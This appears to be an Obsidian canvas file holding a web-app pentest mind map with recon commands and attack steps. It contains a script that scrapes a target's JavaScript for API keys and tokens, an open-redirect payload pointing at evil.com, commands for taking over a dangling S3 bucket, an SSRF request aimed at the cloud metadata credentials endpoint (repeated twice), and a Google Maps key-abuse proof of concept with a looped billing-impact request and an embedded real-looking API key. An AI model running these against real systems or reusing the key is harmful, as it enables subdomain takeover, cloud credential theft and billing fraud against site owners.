{
	"nodes":[
		{"id":"9c3b809fd4d14084","type":"text","text":"WEB-APP PENTEST","x":420,"y":-600,"width":240,"height":60},
		{"id":"fddae37b2ef10c84","type":"text","text":"Check for the parameter named `redirect` that is used to redirect the site to the internal sites and then try to pollute it like : `https://app.target.com/login?redirect=dashboard&redirect=https://evil.com`","x":980,"y":-1238,"width":934,"height":118},
		{"id":"a0c7a30418b32ee7","type":"text","text":"Bruteforce checking all JS Files : `ffuf -w common.txt -u https://target.com/assets/js/FUZZ`","x":980,"y":-860,"width":497,"height":91},
		{"id":"a53eb7b38cd18235","type":"text","text":"### Check for AWS Bucket\nCheck CNAME using the command : `dig old-staging.target.com CNAME` . If the result looks like this : `old-staging.target.com.  300 IN CNAME  old-target-dev.s3-website-us-east-1.amazonaws.com.` Then use the command : `aws s3 ls s3://old-target-dev` to check for the existence of the bucket.\nIf this has happened this shows that, the origin S3 bucket was gone, but is still present as the CNAME of the target. Now we can own the bucket under our account using the command : `aws s3 mb s3://old-target-dev` . Create a simple HTML Page to host the website. Upload it using the command : ```aws s3 website s3://old-target-dev --index-document index.html\naws s3 cp index.html s3://old-target-dev/ --acl public-read```\nThen to chain it with SSRF, we can use this command by making some changes into it  : `curl -X POST http://old-staging.target.com/api/render -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role\"}'`\nThen to chain it with SSRF, we can use this command by making some changes into it  : `curl -X POST http://old-staging.target.com/api/render -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role\"}'`","x":980,"y":-1820,"width":934,"height":520},
		{"id":"0be3e49c89ab0cde","type":"text","text":"RECON","x":-817,"y":-240,"width":120,"height":50,"color":"1"},
		{"id":"1a7d377f0aabb11c","type":"text","text":"```\nassetfinder --subs-only target.com >> recon.txt  \nsubfinder -d target.com -silent >> recon.txt  \namass enum -passive -d target.com >> recon.txt  \nsort -u recon.txt > final-subs.txt\ncat final-subs.txt | httpx -status-code -title -tech-detect -silent > live-subs.txt","x":-1237,"y":-100,"width":960,"height":200},
		{"id":"53ea1afd49059c02","type":"text","text":"\n```\n#!/bin/bash\n\n# Usage: ./find_secrets_in_js.sh https://example.com\n\nTARGET_URL=\"$1\"\n\nif [ -z \"$TARGET_URL\" ]; then\n    echo \"Usage: $0 <target_url>\"\n    exit 1\nfi\n\n# Create working directory\nWORKDIR=\"js_secrets_scan_$(date +%s)\"\nmkdir \"$WORKDIR\"\ncd \"$WORKDIR\" || exit 1\n\necho \"[*] Fetching JavaScript file URLs from $TARGET_URL\"\n\n# Extract JS file links\ncurl -s \"$TARGET_URL\" | \\\ngrep -oP '(?i)(src=[\"'\"'\"'].*?\\.js[\"'\"'\"'])' | \\\ngrep -oP '(?<=src=[\"'\"'\"']).*?\\.js(?=[\"'\"'\"'])' | \\\nsed \"s|^/|$TARGET_URL/|\" | \\\nsed \"s|^//|https://|\" | \\\nsort -u > js_files.txt\n\necho \"[*] Found $(wc -l < js_files.txt) JavaScript files\"\n\n# Download and combine JS contents\n> all_javascript_dump.txt\nwhile read -r js_url; do\n    echo \"[+] Downloading: $js_url\"\n    curl -s \"$js_url\" >> all_javascript_dump.txt\n    echo -e \"\\n\\n// --- End of $js_url ---\\n\\n\" >> all_javascript_dump.txt\ndone < js_files.txt\n\necho \"[*] Searching for potential secrets...\"\n\n# Grep for common secrets in all JS files\ngrep -iE \"apikey|api_key|token|secret|authorization|bearer|client[_-]?id|client[_-]?secret\" all_javascript_dump.txt > secrets_found.txt\n\necho \"[*] Found potential secrets (if any):\"\ncat secrets_found.txt\n\necho \"[*] All results saved in: $WORKDIR\"\n```\n\n","x":-162,"y":-100,"width":1405,"height":1280},
		{"id":"5230a99c8d101337","type":"text","text":"Download JS Files & Extract for APIKeys|Tokens|Bearer|Secret","x":160,"y":-240,"width":762,"height":50,"color":"1"},
		{"id":"6bc330b2fc3ba9f0","type":"text","text":"API KEYS","x":1834,"y":-265,"width":160,"height":50,"color":"1"},
		{"id":"dd250f0f39d5806c","type":"text","text":"\n[ ] - Check with this command if we get any response or not : `curl \"https://maps.googleapis.com/maps/api/geocode/json?address=Delhi&key=<exposed-key>\" \n[ ] -  Check for High Billing Impact : \n```\nfor i in {1..10}; do\ncurl \"https://maps.googleapis.com/maps/api/geocode/json?address=New+York+$i&key=<exposed-apikey>\"\ndone\n```\n\n[ ] - Check for Directions API : `curl \"https://maps.googleapis.com/maps/api/directions/json?origin=Delhi&destination=Mumbai&key=<exposed-apikey>\"`\n [ ] - Check for DistanceMatrix API : `curl \"https://maps.googleapis.com/maps/api/distancematrix/json?origins=Delhi&destinations=Bangalore&key=<exposed-apikey>\"`\n [ ] - Check for Places API : `curl \"https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants+in+Goa&key=<exposed-apikey>\"`\n [ ] - Create an HTML Page and try to use the key and get the services running : \n```\n<!DOCTYPE html>\n<html>\n  <head>\n\t<title>Google Maps API PoC</title>\n\t<style>\n\t  #map {\n\t\theight: 500px;\n\t\twidth: 100%;\n\t\tborder: 2px solid red;\n\t  }\n\t</style>\n\t<script>\n\t  function initMap() {\n\t\tconst map = new google.maps.Map(document.getElementById(\"map\"), {\n\t\t  center: { lat: 28.6139, lng: 77.2090 },\n\t\t  zoom: 8,\n\t\t});\n\t  }\n\t</script>\n  </head>\n  <body>\n\t<h2>Google Maps API PoC</h2>\n\t<p>This page demonstrates unauthorized use of a restricted API key.</p>\n\t<div id=\"map\"></div>\n\n\t<script async defer\n\t  src=\"https://maps.googleapis.com/maps/api/js?key=AIzaSyDGIbHRgermtM8qzUrn2YsGiOd6Vf5PJws&callback=initMap\">\n\t</script>\n  </body>\n</html>","x":1434,"y":-40,"width":960,"height":1425},
		{"id":"c35142d69afa5005","type":"text","text":"Google Map API Key Exploitation PoC","x":1689,"y":-180,"width":451,"height":60},
		{"id":"284b8faa3044ecaf","type":"text","text":"Check for `robots.txt` and `sitemap.xml` for subdomains and directories","x":980,"y":-1040,"width":480,"height":100},
		{"id":"0ed3ba2ff4db3202","type":"text","text":"CHECKS","x":470,"y":-1239,"width":140,"height":60}
	],
	"edges":[
		{"id":"71f36802204b6844","fromNode":"0be3e49c89ab0cde","fromSide":"bottom","toNode":"1a7d377f0aabb11c","toSide":"top"},
		{"id":"1a2c3ec86edc5279","fromNode":"9c3b809fd4d14084","fromSide":"bottom","toNode":"0be3e49c89ab0cde","toSide":"top"},
		{"id":"9bd30b354a66c0c6","fromNode":"9c3b809fd4d14084","fromSide":"bottom","toNode":"5230a99c8d101337","toSide":"top"},
		{"id":"433b8d6074a1b0f0","fromNode":"5230a99c8d101337","fromSide":"bottom","toNode":"53ea1afd49059c02","toSide":"top"},
		{"id":"16b21839c1ab1e29","fromNode":"9c3b809fd4d14084","fromSide":"top","toNode":"0ed3ba2ff4db3202","toSide":"bottom"},
		{"id":"d2d6495b73ac58e6","fromNode":"0ed3ba2ff4db3202","fromSide":"right","toNode":"fddae37b2ef10c84","toSide":"left"},
		{"id":"b47808662c4dc530","fromNode":"0ed3ba2ff4db3202","fromSide":"right","toNode":"a0c7a30418b32ee7","toSide":"left"},
		{"id":"1a5454bf5358fd66","fromNode":"0ed3ba2ff4db3202","fromSide":"right","toNode":"284b8faa3044ecaf","toSide":"left"},
		{"id":"1858e76989239788","fromNode":"0ed3ba2ff4db3202","fromSide":"right","toNode":"a53eb7b38cd18235","toSide":"left"},
		{"id":"ae575c8e2697c17f","fromNode":"9c3b809fd4d14084","fromSide":"bottom","toNode":"6bc330b2fc3ba9f0","toSide":"top"},
		{"id":"9f5390ea063e33db","fromNode":"6bc330b2fc3ba9f0","fromSide":"bottom","toNode":"dd250f0f39d5806c","toSide":"top"}
	]
}